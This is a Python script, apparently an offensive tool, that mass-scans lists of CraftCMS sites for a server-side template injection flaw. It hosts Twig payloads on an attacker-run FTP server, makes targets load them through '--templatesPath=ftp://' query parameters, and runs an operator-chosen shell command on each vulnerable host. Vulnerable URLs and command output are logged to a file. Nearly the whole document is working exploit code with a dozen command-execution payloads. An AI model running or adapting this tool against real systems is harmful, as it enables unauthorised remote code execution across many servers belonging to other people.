#!/usr/bin/env python3
import requests
import argparse
import threading
import multiprocessing
import time
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import logging
import sys
import os
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import queue
import signal

#written by Chirag Artani

# Suppress warnings and logging
logging.getLogger().setLevel(logging.CRITICAL)
requests.packages.urllib3.disable_warnings()

class SilentFTPHandler(FTPHandler):
    def log(self, msg, *args, **kwargs):
        pass

def get_ssti_payloads(command="id"):
    """Return list of SSTI payloads for CraftCMS/Twig"""
    payloads = [
        # Basic test payload
        '''<html><body>kishoriya {{ 7*7 }}</body></html>''',
        
        # Command execution payloads
        f'''<html><body>kishoriya {{{{ craft.app.config.general|merge(["system", "{command}"])|join(' ')|raw }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ _self.env.getFilter("replace").getCallable().call(_context, "{command}")|raw }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ craft.app.config|merge(["system", "{command}"])|join(' ')|raw }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ craft.app.view.evaluateDynamicContent("{command}")|raw }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ _context.env.getFilter("nl2br").getCallable().getClosure().bindTo(craft.app.config.general).call("{command}")|raw }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ craft.app.config.general.devMode ? "{command}"|raw : "" }}}}</body></html>''',
        f'''<html><body>kishoriya {{% set cmd = "{command}" %}}{{{{ attribute(_context, "system")(cmd) }}}}</body></html>''',
        f'''<html><body>kishoriya {{% set cmd = "{command}" %}}{{{{ craft.app.request.shellExecute(cmd) }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ ["{command}"]|filter("system")|join }}}}</body></html>''',
        f'''<html><body>kishoriya {{% set foo = craft.app.config.general|merge(["{command}"]) %}}{{{{ foo|join("") }}}}</body></html>''',
        f'''<html><body>kishoriya {{{{ dump(craft.app.request.shellExecute("{command}")) }}}}</body></html>''',
    ]
    return payloads

def setup_ftp_server(ip, port, command="id", payload_index=0):
    """Setup FTP server with specified SSTI payload"""
    if not os.path.exists('ftp_root'):
        os.makedirs('ftp_root')
    
    payloads = get_ssti_payloads(command)
    selected_payload = payloads[payload_index % len(payloads)]
    
    with open('ftp_root/index.html', 'w') as f:
        f.write(selected_payload)

    authorizer = DummyAuthorizer()
    authorizer.add_anonymous('ftp_root', perm='elr')

    handler = SilentFTPHandler
    handler.authorizer = authorizer
    handler.banner = ""
    
    server = FTPServer((ip, port), handler)
    server.max_cons = 256
    server.max_cons_per_ip = 5
    
    return server, selected_payload

def extract_output(text):
    """Extract and clean command output"""
    text = text.strip()
    if any(x in text.lower() for x in ['uid=', 'gid=', 'www-data', 'root', '/home']):
        lines = text.split('\n')
        clean_lines = []
        for line in lines:
            line = line.strip()
            if line and len(line) < 200:
                if any(x in line.lower() for x in ['uid=', 'gid=', 'www-data', 'root', '/home']):
                    clean_lines.append(line)
        if clean_lines:
            return '\n'.join(clean_lines[:2])
    return None

def test_single_url(url, vps_ip, ftp_port):
    """Test a single URL"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url.strip()
        
        session = requests.Session()
        session.verify = False
        session.timeout = 5
        
        # Test config path
        config_url = f"{url}/?--configPath=/kishore"
        config_resp = session.get(config_url)
        
        if config_resp.status_code == 200 and "mkdir()" in config_resp.text:
            # Test template path
            template_url = f"{url}/?--templatesPath=ftp://{vps_ip}:{ftp_port}/"
            template_resp = session.get(template_url)
            
            if template_resp.status_code == 200:
                text = template_resp.text
                # Check for SSTI vulnerability
                if "kishoriya 49" in text:
                    output = extract_output(text)
                    return url, text, output
        return None
    except:
        return None

def worker(task_queue, result_queue, vps_ip, ftp_port, pbar):
    """Worker function for processing URLs"""
    session = requests.Session()
    session.verify = False
    
    while True:
        try:
            url = task_queue.get_nowait()
        except queue.Empty:
            break
            
        result = test_single_url(url, vps_ip, ftp_port)
        if result:
            url, text, output = result
            result_queue.put((url, output))
            print(f"\n[!] Found vulnerable: {url}")
            if output:
                print(f"[+] Command output: {output}")
            with open('vulnerable.txt', 'a') as f:
                f.write(f"{url}")
                if output:
                    f.write(f" | {output}")
                f.write("\n")
        pbar.update(1)

def process_urls(urls, vps_ip, ftp_port, num_threads, pbar):
    """Process URLs using thread pool"""
    task_queue = queue.Queue()
    result_queue = queue.Queue()
    
    # Fill task queue
    for url in urls:
        task_queue.put(url)
    
    # Create and start worker threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=worker,
            args=(task_queue, result_queue, vps_ip, ftp_port, pbar)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    # Collect results
    results = []
    while not result_queue.empty():
        results.append(result_queue.get())
    
    return results

def main():
    parser = argparse.ArgumentParser(description='CraftCMS SSTI Vulnerability Tester')
    parser.add_argument('-f', '--file', required=True, help='File containing URLs to test')
    parser.add_argument('-i', '--ip', required=True, help='VPS IP address')
    parser.add_argument('-p', '--port', type=int, default=6666, help='FTP port (default: 6666)')
    parser.add_argument('-pr', '--processes', type=int, default=4, help='Number of processes (default: 4)')
    parser.add_argument('-t', '--threads', type=int, default=200, help='Threads per process (default: 200)')
    parser.add_argument('-c', '--command', type=str, default='id', help='Command to execute (default: id)')
    
    args = parser.parse_args()
    
    try:
        print("[*] Starting scan with initial payload...")
        total_payloads = len(get_ssti_payloads())
        
        # Load URLs
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        total_urls = len(urls)
        print(f"[*] Loaded {total_urls} URLs")
        
        # Try each payload
        for payload_index in range(total_payloads):
            try:
                # Setup FTP server with current payload
                ftp_server, current_payload = setup_ftp_server(args.ip, args.port, args.command, payload_index)
                ftp_thread = threading.Thread(target=ftp_server.serve_forever)
                ftp_thread.daemon = True
                ftp_thread.start()
                time.sleep(1)
                
                print(f"\n[*] Testing payload #{payload_index + 1}/{total_payloads}")
                
                # Process URLs with current payload
                with tqdm(total=total_urls, desc="Progress", unit="url") as pbar:
                    chunk_size = total_urls // args.processes + 1
                    chunks = [urls[i:i + chunk_size] for i in range(0, total_urls, chunk_size)]
                    processes = []
                    
                    for chunk in chunks:
                        p = multiprocessing.Process(
                            target=process_urls,
                            args=(chunk, args.ip, args.port, args.threads, pbar)
                        )
                        p.start()
                        processes.append(p)
                    
                    for p in processes:
                        p.join()
                
                # Clean up current FTP server
                ftp_server.close_all()
                
            except KeyboardInterrupt:
                raise
            except:
                continue
        
        # Show final results
        print("\n[*] Scan completed")
        try:
            with open('vulnerable.txt', 'r') as f:
                vulnerable = [line.strip() for line in f if line.strip()]
            
            if vulnerable:
                print(f"\n[+] Found {len(vulnerable)} vulnerable targets:")
                for result in vulnerable:
                    print(f"- {result}")
                print(f"\n[+] Results saved in 'vulnerable.txt'")
            else:
                print("\n[-] No vulnerable targets found")
        except:
            print("\n[-] No results file found")
            
    except KeyboardInterrupt:
        print("\n[*] Scan interrupted")
    finally:
        print("[*] Cleaning up...")
        if os.path.exists('ftp_root'):
            try:
                os.remove('ftp_root/index.html')
                os.rmdir('ftp_root')
            except:
                pass

if __name__ == "__main__":
    # Set larger stack size for threads
    threading.stack_size(2*1024*1024)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)
